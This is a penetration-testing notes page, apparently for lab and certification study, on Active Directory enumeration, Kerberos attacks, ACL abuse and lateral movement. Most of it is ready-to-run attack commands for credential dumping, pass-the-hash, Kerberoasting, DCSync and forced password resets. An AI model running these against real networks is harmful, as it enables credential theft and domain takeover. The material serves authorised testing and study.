+++
title = 'Internal Enumeration & Lateral Movement'
date = 2026-10-30
type = 'notes'
weight = 20
toc = true
tags = ['active-directory', 'enumeration', 'lateral-movement', 'bloodhound']
+++

> After finding valid credentials for the Active Directory environment, the objective is to compromise the entire forest. That means moving laterally between users and machines until you hold privileged access to a domain controller — and in 2026, that path is more often a **chain of misconfigurations and coercion primitives** than a single exploit. This page covers the enumeration that finds those paths, the tooling that maps them, and the lateral-movement techniques that traverse them.

> **2026 context that shapes this page:** Microsoft's NTLM deprecation Phase 3 (October 2026) blocks **NTLMv1 SSO by default**, but **NTLMv2 — the version used in relay — remains permitted indefinitely**. The classic **Coercion → NTLM Relay → ADCS ESC8 → Domain Admin** chain still works against the majority of enterprise environments running Server 2019/2022. CVE-2025-33073 resurrected NTLM reflection with **no admin prerequisite**, and new coercion primitives continue to emerge from unexpected surfaces (Snipping Tool, file pickers, Office handlers).

---

## 1. Enumerating Security Controls

### Windows Defender, AppLocker, and PowerShell language mode

```powershell
# Defender status
Get-MpComputerStatus

# AppLocker policy
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

# PowerShell language mode (ConstrainedLanguage = AppLocker/WDAC enforcing)
$ExecutionContext.SessionState.LanguageMode
```

### LAPS enumeration

> **LAPS** manages unique, randomised local-admin passwords on domain-joined hosts. Passwords are stored centrally in AD and restricted through ACLs. Enumerating LAPS is useful for finding **users who have read access to LAPS passwords** — a conditional path from ordinary account management to local administrator access.

**LAPSToolkit:**

```powershell
Import-Module .\LAPSToolkit.ps1
Find-LAPSDelegatedGroups
Find-AdmPwdExtendedRights
Get-LAPSComputers
```

**Modern Windows LAPS** (`msLAPS-Password`) is often **DPAPI-NG-encrypted** — directory read permission and password-decryption authority are **separate requirements**. Check `pylaps` or the LAPSv2.0 documentation before assuming a readable attribute yields a cleartext password.

---

## 2. Authenticated Enumeration

### BloodHound — the 2026 collector landscape

BloodHound remains the central enumeration platform, but the **collector ecosystem and the graph model have expanded significantly**.

#### Collectors

| Collector | Platform | Notes |
|---|---|---|
| **SharpHound** | Windows | The original C# collector; v2.11.0 as of the March 2026 release |
| **bloodhound-python** | Linux | The Linux-side collector; supports `-c All`, `--zip` |
| **RustHound** | Linux | Rust rewrite, faster on large domains |
| **pwnrm `!bloodhound`** | Linux/Windows | **In-memory** AD graph collector (BloodHound CE) inside a WinRM post-exploitation shell — no file drop |

```bash
# Linux
sudo bloodhound-python --zip -c All -d example.domain -u 'username' -p 'password' -ns <nameserver-ip>
```

```powershell
# Windows
.\SharpHound.exe -c All --zipfilename NAME
```

#### BloodHound 2026 features you should know

- **Property-based edge matching (OpenGraph `match_by: "property"`)** — links nodes across systems using attributes like email, username, or hostname, enabling **hybrid AD + Entra ID + SaaS** attack paths.
- **Privilege Zones (GA)** — organise objects by privilege tier and monitor tier-model violations, which is the graph-native equivalent of the Enterprise Access Model.
- **SCCM collection via ConfigManBearPig** — brings **Microsoft Configuration Manager (SCCM)** attack paths into BloodHound using OpenGraph.
- **ManagerOfHound** — collects **manager–subordinate** relationships and exports custom `ManagerOf` edges, useful for self-service password-reset portals.
- **BloodHound 9.0 / OpenGraph extensions** — attack paths now extend to **Okta, GitHub, and Jamf**, not just AD and Entra ID.
- **OpenHound** — a framework for collecting and converting external data into BloodHound nodes and edges.

> **Collection compatibility warning:** upgrade **AzureHound and OpenHound before November 2026** to avoid ingest issues with case-sensitive object IDs.

### Users and groups

```powershell
# Current user's group membership
(New-Object System.DirectoryServices.DirectorySearcher("(&(objectCategory=User)(samAccountName=$($env:username)))")).FindOne().GetDirectoryEntry().memberOf
```

```bash
# NetExec
netexec smb 172.16.5.5 -u validuser -p validpassword --users
netexec smb 172.16.5.5 -u validuser -p validpassword --rid-brute
netexec smb 172.16.5.5 -u validuser -p validpassword --groups
netexec smb 172.16.5.125 -u validuser -p validpassword --loggedon-users
```

**WindapSearch:**

```bash
./windapsearch -d domain.example --dc 10.10.11.35 -u 'user' -p 'password' -m users
python3 windapsearch.py --dc-ip 172.16.5.5 -u domain\validuser -p validpassword --da
python3 windapsearch.py --dc-ip 172.16.5.5 -u domain\validuser -p validpassword -PU
```

**rpcclient:**

```bash
rpcclient -U 'domain\username%password' <ip>
# then: enumdomusers
# then: queryuser 0x457
```

### New enumeration frameworks (2025–2026)

| Tool | What it adds |
|---|---|
| **GoFenrir** | Go rewrite of NetExec's concept, built on **Manticore** rather than Impacket — single binary, no Python dependency. Supports LDAP/LDAPS, SMB v1/v2/v3, and native Kerberos (auth, Kerberoast, ASREPRoast, DCSync, Shadow Credentials) |
| **rpcclient-ng** | Go rewrite of Samba's `rpcclient`, single static binary. Adds **RID cycling fallback**, **decoded account-control flags** (`AS-REP_ROASTABLE`, `TRUSTED_FOR_DELEG`), **JSON output**, and a one-shot `sweep` recon report |
| **pwnrm** | Operator-grade WinRM post-exploitation platform: multi-session graph orchestration, in-band SOCKS5, **ADCS ESC1–ESC17+**, Diamond Ticket suite, **in-memory BloodHound collection**, and a lateral-movement engine (`!lateral`) |
| **PyADRecon / PyADRecon-ADWS** | Python implementations of ADRecon; the **ADWS** variant uses Active Directory Web Services instead of LDAP (Server 2025+ schema) |
| **adnullenum** | One-pass **anonymous** AD enumeration over SAMR and LSARPC — null session, no credentials, structured output |

---

## 3. Lateral Movement

### Host and group discovery

```powershell
netdom query /domain:inlanefreight.local dc
netdom query /domain:inlanefreight.local workstation
Get-NetLocalGroupMember -ComputerName NAME -GroupName "Remote Desktop Users"
Get-NetLocalGroupMember -ComputerName NAME -GroupName "Remote Management Users"
```

### WinRM / PowerShell Remoting

```powershell
$password = ConvertTo-SecureString "PasswordHere" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ("DOMAIN\username", $password)
Enter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred
```

```bash
evil-winrm -i 10.129.201.234 -u forend
```

### CredSSP — solving the double-hop problem

**pwnrm** exposes this directly as a first-class flag:

```bash
pwnrm -u admin -p 'P@ss' --credssp dc01.corp.local
```

CredSSP delegates credentials to the target, allowing a second hop that plain WinRM cannot make — the practical workaround for the Kerberos double-hop limitation.

### SMB share enumeration

```bash
# NetExec
netexec smb 172.16.5.5 -u validuser -p validpassword --shares
netexec smb 172.16.5.5 -u validuser -p validpassword -M spider_plus --share sharename

# SMBMap
smbmap -u validuser -p validpassword -d INLANEFREIGHT.LOCAL -H 172.16.5.5
smbmap -u validuser -p validpassword -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -r SHARENAME --dir-only

# Recursive download
smbget -u guest -R smb://10.129.8.111/Development/
```

**Snaffler** (Windows) and **Scavenger** (Linux) remain the credential-hunting workhorses:

```powershell
.\Snaffler.exe -d INLANEFREIGHT.LOCAL -s -v data
```

```bash
python3 ./scavenger.py smb -t 10.0.0.10 -u administrator -p Password123 -d testdomain.local
```

---

## 4. PowerView — Key Commands

> Import first: `Import-Module .\PowerView.ps1`

### Domain, ACLs, and policies

| Command | Description |
|---|---|
| `Get-Domain` | Current domain information |
| `Get-DomainController` | Domain controllers |
| `Get-DomainOU` | Organizational units |
| `Find-InterestingDomainAcl` | Interesting ACLs |
| `Get-DomainGPO` | Group Policy Objects |
| `Get-DomainPolicy` | Default domain / DC policy |

### Users and groups

| Command | Description |
|---|---|
| `ConvertTo-SID <string>` | Name → SID |
| `Get-DomainUser` | All or specific users |
| `Get-DomainComputer` | All or specific computers |
| `Get-DomainGroup` | All or specific groups |
| `Get-DomainGroupMember -Identity "Domain Admins" -Recurse` | Group members |
| `Get-NetLocalGroup` | Local groups on a machine |
| `Get-NetLocalGroupMember` | Local group members |
| `Get-NetSession` | Session information |
| `Test-AdminAccess` | Admin access check |
| `Find-LocalAdminAccess` | Machines where the current user is local admin |

### Shares and trusts

| Command | Description |
|---|---|
| `Get-NetShare` | Open shares on a machine |
| `Find-DomainShare` | Reachable domain shares |
| `Find-InterestingDomainShareFile` | Files matching criteria in shares |
| `Get-DomainTrust` | Domain trusts |
| `Get-ForestTrust` | Forest trusts |
| `Get-DomainForeignUser` | Users in groups outside their domain |
| `Get-DomainForeignGroupMember` | Groups with members outside the domain |
| `Get-DomainTrustMapping` | All trusts for the current domain and beyond |

---

## 5. Kerberos Attacks — Updated for 2026

Kerberos is the default domain authentication protocol: a stateless ticket-based system where the KDC issues a TGT (encrypted with the user's password hash) and then a TGS (encrypted with the service's password hash). The attacks below target the ticket issuance and validation logic rather than the passwords themselves.

### Kerberoasting

> Request TGS tickets for accounts with `ServicePrincipalName` set, then crack them offline. Any authenticated user can request them — no special privilege required.

**Enumerate SPN accounts:**

```bash
impacket-GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/username
```

```powershell
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
setspn.exe -Q */*
```

**Request tickets:**

```bash
# All tickets
impacket-GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/username -request -outputfile filename

# Single user
impacket-GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/username -request-user target-user -outputfile filename
```

```powershell
# PowerView
Get-DomainUser -Identity targetuser | Get-DomainSPNTicket -Format Hashcat

# setspn
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

# Rubeus — specific user
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast /nowrap

# Rubeus — adminCount=1
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1'

# Rubeus — all
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast /nowrap
```

**Crack:**

```bash
hashcat -m 13100 tgstickethashfile /usr/share/wordlists/rockyou.txt
john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt hashes.kerberoast
```

> **RC4 vs AES:** Kerberoasting tools typically request **RC4** because it is weaker and faster to crack. RC4 tickets begin with `$krb5tgs$23$*`; AES tickets begin with `$krb5tgs$18$*` or `$krb5tgs$17$*`. If the domain enforces AES-only, you can still request a ticket, but cracking is significantly slower.

**Clock skew:** `KRB_AP_ERR_SKEW` means your clock is more than ~5 minutes off the DC. Fix with `sudo rdate -n <dc-ip>` or `sudo ntpdate <dc-fqdn>`.

### AS-REP Roasting

> Accounts with **Kerberos pre-authentication disabled** (`DONT_REQ_PREAUTH`) return an AS-REP encrypted with their password hash — crackable offline **without any credential**.

**Enumerate:**

```powershell
Get-DomainUser -PreauthNotRequired -verbose
```

```bash
impacket-GetNPUsers domain.example -usersfile usernames.txt -dc-ip <DC-IP> -format hashcat -outputfile hashes.asreproast
```

**Roast:**

```powershell
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast /user:username
```

```bash
impacket-GetNPUsers domain.name/validuser:validpass -dc-ip 10.10.10.1 -usersfile usernames.txt -request -format hashcat -outputfile hashes.txt
```

**Crack:**

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast /usr/share/wordlists/rockyou.txt
```

### ResetNightmare — CVE-2026-27912 (Password Reset via Kerberos Identity Spoofing)

A logic bug in the **Kerberos Change Password protocol (RFC 3244 / kpasswd)** that lets **any low-privileged domain user reset the password of any target account**, including Domain Admins. It bypasses the 2021 "Dollar Ticket" patch because `kpasswd` sidesteps the TGS-REQ validation layer where requester SIDs are checked.

| Property | Detail |
|---|---|
| **CVE** | CVE-2026-27912 |
| **Type** | Kerberos Change Password validation flaw |
| **Prerequisite** | An attacker-controlled account with **`WriteProperty` on its own `userPrincipalName`** (default self-write permission) |
| **Impact** | Any domain user → any account password reset → full domain compromise |
| **Patch** | March/April 2026 Microsoft updates (rated **Important**, not Critical) |
| **PoC** | `ResetNightmare.ps1` + ActiveDirectory module + `Rubeus.exe` |

**Attack flow:**

1. Modify your own `userPrincipalName` to spoof the target identity.
2. Obtain a Kerberos ticket using **NT-ENTERPRISE** and the **`kadmin/changepw`** service.
3. Clear the UPN.
4. Reset the target password.

**Detection:** Splunk's `Windows AD User Suspicious UPN Change` analytic looks for **Event 4738** where an account modifies its own UPN to a value **without an `@` sign**, excluding placeholders and selected system identities. The analytic requires DC security logs and User Account Management auditing, is **disabled by default**, and can flag legitimate provisioning or migration activity.

### KerberLoss — CVE-2026-25177 (Unicode SPN Uniqueness Bypass)

Active Directory's LDAP engine **ignores hundreds of Unicode characters** when checking SPN uniqueness. This lets an attacker register a Service Principal Name that collides with an existing one, enabling **service hijacking, Kerberos constrained delegation abuse, and NTLM downgrade attacks**.

| Property | Detail |
|---|---|
| **CVE** | CVE-2026-25177 |
| **Type** | SPN uniqueness bypass via Unicode normalisation |
| **Impact** | Service hijacking, constrained delegation abuse, NTLM downgrade |
| **Patch** | March/April 2026 updates |

**Practical consequence:** if you can write an SPN to an account you control (via `GenericWrite` on a user), you can create a **Unicode-variant SPN** that the KDC treats as distinct from the legitimate one but that clients resolve to your account — a stealthier alternative to the classic targeted Kerberoasting SPN injection.

### Pass the Hash (PtH)

> Use a password **hash** instead of a plaintext password. The hash remains static for every session until the password is changed. You need administrative privileges or particular rights on the target to **obtain** the hash in the first place.

**Windows — Mimikatz:**

```cmd
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:username /rc4:<hash> /domain:domain.name /run:cmd.exe" "exit"
```

**Linux:**

```bash
# PsExec
impacket-psexec user@targetIP -hashes :hash

# evil-winrm
evil-winrm -i <ip> -u Administrator -H "<passwordhash>"

# NetExec — domain account
netexec smb targetIP -u Administrator -H <hash> -d domain.name

# NetExec — local SAM hash
netexec smb targetIP -u Administrator -H <hash> --local-auth
```

**RDP:**

```bash
xfreerdp /v:targetIP /u:user /pth:hashvalue
```

If Restricted Admin Mode is disabled, you get “account restrictions are preventing this user from signing in.” Enable it:

```cmd
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

### Pass the Ticket (PtT)

> Use a **stolen Kerberos ticket** (TGT or TGS) for lateral movement instead of an NTLM hash. The ticket is stored in the current logon session.

**Rubeus:**

```powershell
# Request a TGT with a hash and inject it
Rubeus.exe asktgt /domain:domain.name /user:username /rc4:hash /ptt

# Inject a .kirbi file
Rubeus.exe ptt /ticket:file.kirbi

# Base64-encoded .kirbi
[Convert]::ToBase64String([IO.File]::ReadAllBytes("file.kirbi"))
Rubeus.exe ptt /ticket:base64output
```

**Mimikatz:**

```cmd
mimikatz.exe "privilege::debug" "kerberos::ptt C:\path\file.kirbi" "exit"
```

**PowerShell Remoting after PtT:**

```powershell
Enter-PSSession -ComputerName DC01
```

### Diamond Ticket (2026 OPSEC improvement)

A **Diamond Ticket** is created from a **legitimate TGT** rather than fabricated from scratch. It inherits a real issuance time and avoids the “never logged in” anomaly that some detections key on. **pwnrm** ships a Diamond Ticket suite as a first-class feature.

### Cached credentials (LSASS)

Windows caches password hashes in **LSASS** memory to renew TGTs. Extracting them requires **SYSTEM or local administrator** rights, and the in-memory structures are undocumented and encrypted with an LSASS-stored key.

```cmd
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

This dumps hashes for all logged-on users, including RDP sessions. On hardened hosts, check `RunAsPPL` and Credential Guard first — both block this path.

### Kerberos double-hop problem

Kerberos does **not** cache credentials in memory for delegated authentication. When you use WinRM to reach Host A and then try to reach Host B from A, your credentials are not forwarded — the second hop fails. Workarounds:

- **CredSSP** (pwnrm `--credssp`)
- **Resource-based constrained delegation** (RBCD)
- **`Invoke-Command -Credential`** with explicit credentials at each hop
- **PSSession configuration** with `Register-PSSessionConfiguration`

---

## 6. ACL Enumeration and Abuse

> Enumerating ACLs in AD often establishes **persistence, lateral movement, or privilege escalation** — a single ACE on the right object is a domain-compromise primitive.

### High-value ACEs

| Edge | Primitive | Quick abuse |
|---|---|---|
| **ForceChangePassword** | Reset a password without knowing the current one | `Set-DomainUserPassword`, `net user <user> <pass> /domain` |
| **GenericWrite (user)** | Write any non-protected attribute | Targeted Kerberoast (`Set-DomainObject -SET @{serviceprincipalname='fake/host'}`), Shadow Credentials |
| **GenericWrite (group)** | Add members | `Add-DomainGroupMember -Identity <group> -Members <user>` |
| **GenericWrite (computer)** | RBCD, LAPS read | `impacket-rbcd`, read `ms-Mcs-AdmPwd` |
| **AddSelf** | Join a group | Add your account to the group |
| **GenericAll (user)** | Full control | Reset password, fake SPN, Shadow Credentials |
| **GenericAll (group)** | Full control | Add/remove members, modify attributes |
| **GenericAll (computer)** | Full control | Write `msDS-AllowedToActOnBehalfOfOtherIdentity` (RBCD), read LAPS |
| **WriteDACL** | Modify the DACL | Grant yourself `FullControl` or DCSync rights; `dacledit.py`, `bloodyAD add dacl` |
| **WriteOwner** | Change owner → write DACL | `Set-DomainObjectOwner`, `bloodyAD set owner` |
| **AllExtendedRights** | Password reset + DCSync on the domain object | `DS-Replication-Get-Changes*` |
| **AddKeyCredentialLink** | Shadow Credentials | `Whisker`, `pyWhisker`, `certipy shadow` |
| **ReadLAPSPassword / ReadGMSAPassword** | Read managed passwords | Local admin or service auth |
| **GPO abuse** | Push a scheduled task or local admin | `SharpGPOAbuse`, `pyGPOAbuse` |

### Manual ACL enumeration with PowerView

```powershell
Import-Module .\PowerView.ps1

# Interesting ACLs
Find-InterestingDomainAcl

# Target user's SID
$sid = Convert-NameToSid targetuser

# Target user's group membership
Get-DomainUser -Identity targetuser | select samaccountname,objectsid,memberof,useraccountcontrol | fl

# All objects the user has rights over
Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}

# Resolve GUIDs to readable names
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```

**DCSync rights check:**

```powershell
$sid = "SID-VALUE"
Get-ObjectAcl "DC=domainname,DC=local" -ResolveGUIDs |
  ? { ($_.ObjectAceType -match 'Replication-Get') } |
  ? { $_.SecurityIdentifier -match $sid } |
  select AceQualifier, ObjectDN, ActiveDirectoryRights, SecurityIdentifier, ObjectAceType | fl
```

### ACL abuse — worked examples

**ForceChangePassword:**

```powershell
$SecPassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\validuser', $SecPassword)
$targetUserNewPassword = ConvertTo-SecureString 'blabla' -AsPlainText -Force

Import-Module .\PowerView.ps1
Set-DomainUserPassword -Identity targetUsername -AccountPassword $targetUserNewPassword -Credential $Cred -Verbose
```

**GenericAll → add to group:**

```powershell
Add-DomainGroupMember -Identity 'Target Group' -Members 'targetuser' -Credential $Cred -Verbose
Get-DomainGroupMember -Identity "Target Group" | Select MemberName
```

**GenericWrite → targeted Kerberoasting:**

```powershell
Set-DomainObject -Credential $Cred -Identity targetuser -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
.\Rubeus.exe kerberoast /user:targetuser /nowrap
```

> **TargetedKerberoast** (Linux) performs the whole chain in one command.

### DCSync

> DCSync mimics a Domain Controller using the **Directory Replication Service Remote Protocol** to retrieve password hashes via the **`DS-Replication-Get-Changes-All`** extended right. Domain Admins and Enterprise Admins have this right by default.

```bash
# Linux
impacket-secretsdump -outputfile inlanefreight_hashes -just-dc \
  INLANEFREIGHT/user-with-replication-rights@172.16.5.5 -use-vss
```

```cmd
:: Windows — Mimikatz
lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
```

---

## 7. Miscellaneous Misconfigurations

### Passwords in the description field

```powershell
Get-DomainUser * | Select-Object samaccountname,description
```

### `passwd_notreqd`

If `passwd_notreqd` is set, the account is **not subject to the current password policy length** — it may have a shorter password or none at all (if empty passwords are allowed).

```powershell
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```

### GPP `cpassword`

When a Group Policy Preference is created, an `.xml` file is written to **SYSVOL**, which **all authenticated domain users can read**. The `cpassword` attribute is **AES-256 encrypted with a key Microsoft published on MSDN** — it is **offline decryption, not cracking**.

```bash
gpp-decrypt <cpassword>
```

```bash
netexec smb -L | grep gpp
```

> **This is not a hash.** Do not run hashcat against a `cpassword` — it decrypts instantly with the public key.

---

## 8. Field Notes from the HTB AD List

- **Assumed breach changes the order of operations.** Administrator, Certified, EscapeTwo, Puppy, and Signed start with credentials: go straight to share enumeration, BloodHound, `certipy find`, and per-service auth checks — not brute force.
- **Cleanup/revert timers are real.** Forest reverts ACL changes after ~60 seconds and TheFrizz runs a cleanup timer; verify each change immediately or script the whole chain.
- **Clock skew.** Kerberos fails around 5 minutes of drift (`KRB_AP_ERR_SKEW`); `sudo ntpdate <dc-fqdn>` and reconnect the VPN. AS-REP roasting tolerates more skew, but delegation and PKINIT do not.
- **`--local-auth` vs domain auth.** A local SAM hash fails when a domain is forced; use `netexec smb <ip> -u scott -H <hash> --local-auth` for local SAM hashes, and omit `--local-auth` for domain accounts (Querier, Signed).
- **MSSQL is an authentication relay and a pivot.** `xp_dirtree` coerces Net-NTLMv2 without code execution (Querier, Giddy); a forged ticket for SQL needs the right **group SIDs** in the PAC, or MSSQL authorizes you as `guest` (Signed).
- **Not every AD-column box has ADCS.** Only Escape (ESC1), EscapeTwo (ESC4), and Certified (ESC9) expose a CA — do not burn time on Certipy for the others.
- **WinRM is not SMB admin.** A WinRM shell and SMB administrative shares are separate rights; test both before concluding you have DA (Return, Administrator).
- **BloodHound's “one-hop” systems are the real targets.** Unconstrained delegation hosts cache TGTs; CVE-2025-33073 makes **any** non-SMB-signing host a one-hop SYSTEM primitive.

Full context: [HTB Active Directory machines](/notes/oscp-labs/ad/).

---

## Quick Reference — New Tools and CVEs (2025–2026)

| Item | Type | What it adds |
|---|---|---|
| **GoFenrir** | Enumeration framework | Go + Manticore; single binary; LDAP/SMB/Kerberos; Kerberoast, ASREPRoast, DCSync, Shadow Credentials |
| **rpcclient-ng** | MS-RPC client | Single static Go binary; RID cycling fallback; decoded flags; JSON output |
| **pwnrm** | WinRM post-exploitation | Multi-session graph, SOCKS5, ADCS ESC1–ESC17+, Diamond Ticket, in-memory BloodHound |
| **PyADRecon-ADWS** | Enumeration | ADWS instead of LDAP; Server 2025+ schema |
| **ConfigManBearPig** | BloodHound collector | SCCM attack paths via OpenGraph |
| **ManagerOfHound** | BloodHound extension | Manager–subordinate `ManagerOf` edges |
| **OpenGraph / OpenHound** | BloodHound | Hybrid AD + Entra + Okta + GitHub + Jamf attack paths |
| **CVE-2026-27912 (ResetNightmare)** | Kerberos | Any domain user → any account password reset via `kpasswd` |
| **CVE-2026-25177 (KerberLoss)** | Kerberos/SPN | Unicode SPN uniqueness bypass → service hijacking, delegation abuse |
| **CVE-2026-54121 (Certighost)** | AD CS | Standard domain account → DC certificate → DCSync |
| **CVE-2025-33073** | NTLM reflection | Any domain user → SYSTEM on any non-SMB-signing host |
| **CVE-2026-33829** | Coercion | Snipping Tool URI → SMB auth → Net-NTLM hash leak |
| **CVE-2025-24054** | Coercion | `.library-ms` NTLM hash disclosure; CISA KEV listed |
| **ESC17** | AD CS | Enrollee-supplied SAN + **Server Authentication** EKU → TLS MITM / WSUS attack |
| **Diamond Ticket** | Kerberos OPSEC | Legitimate TGT base → avoids “never logged in” anomaly |
| **CredSSP** | Lateral movement | Solves the double-hop problem; `pwnrm --credssp` |

This page is the **authenticated → domain admin** bridge: once you have a credential, the enumeration here finds the path, BloodHound maps it, and the Kerberos/ACL/coercion techniques traverse it.
